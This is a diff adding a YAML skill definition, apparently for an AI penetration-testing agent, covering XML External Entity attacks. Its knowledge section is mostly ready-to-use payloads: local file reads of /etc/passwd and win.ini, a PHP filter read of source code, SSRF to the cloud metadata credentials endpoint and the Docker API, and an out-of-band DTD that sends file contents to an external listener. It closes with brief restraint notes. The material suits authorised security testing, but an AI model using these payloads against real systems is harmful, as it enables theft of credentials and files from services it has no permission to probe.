@@ -1,0 +1,57 @@
+schema_version: 1
+version: 3.0.0
+name: xxe
+description: Senior XML External Entity (XXE) assessment — local file disclosure, SSRF via XML parsers, parameter entities, SVG/Office doc transclusion, and parser hardening verification.
+triggers:
+  - xxe
+  - xml
+  - xml external entity
+  - dtd
+  - entity expansion
+  - soap
+  - saml
+  - xml-rpc
+  - svg xxe
+tools:
+  - curl
+knowledge: |
+  Assess XML External Entity (XXE) vulnerabilities with senior red-team precision, targeting parser-level misconfigurations, file disclosure, and internal service transclusion.
+
+  1. PARSER ATTACK SURFACE & INPUT IDENTIFICATION:
+     - Primary XML Endpoints: SOAP services, SAML identity providers, XML-RPC endpoints (`/xmlrpc.php`), and REST APIs accepting `application/xml` or `text/xml`.
+     - Content-Type Switching Technique:
+       When an API consumes JSON (`Content-Type: application/json`), test converting the payload to XML (`Content-Type: application/xml`):
+       `<request><param>value</param></request>`
+       Many framework serializers automatically unmarshal XML with default insecure entity expansion enabled.
+     - Document Processing Pipelines:
+       File upload endpoints processing SVG vector graphics, Microsoft Office documents (`.docx`, `.xlsx`), or PDF generation templates that parse internal XML schemas.
+
+  2. DIRECT FILE DISCLOSURE PAYLOADS:
+     - Linux File Read:
+       `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`
+     - Windows File Read:
+       `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`
+     - PHP Wrapper Base64 Encoding (Prevent Parser Encoding Corruption):
+       When reading application source code or files containing special XML characters (`<`, `&`):
+       `<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>`
+
+  3. SSRF & CONTROL PLANE ACCESS VIA XML:
+     - Transclude internal loopback services and cloud metadata:
+       `<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>`
+       `<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/v1.24/containers/json">]><root>&xxe;</root>`
+
+  4. BLIND XXE VIA PARAMETER ENTITIES (Out-of-Band OOB):
+     - When the application processes XML but does not reflect entity content in the response:
+       Reference an external DTD:
+       `<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://<external_listener>/eval.dtd">%dtd;]>`
+     - Hosted `eval.dtd` structure:
+       `<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<external_listener>/?x=%file;'>">%eval;%exfil;`
+
+  5. EVIDENCE COLLECTION & ETHICAL RESTRAINT:
+     - Extracting a single non-sensitive verification target (e.g. `/etc/hostname` or the first line of `/etc/passwd`) is definitive proof.
+     - NEVER issue Billion Laughs / quadratic entity expansion payloads which cause memory exhaustion DoS.
+references:
+  - persona:xxe-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/xxe.yaml
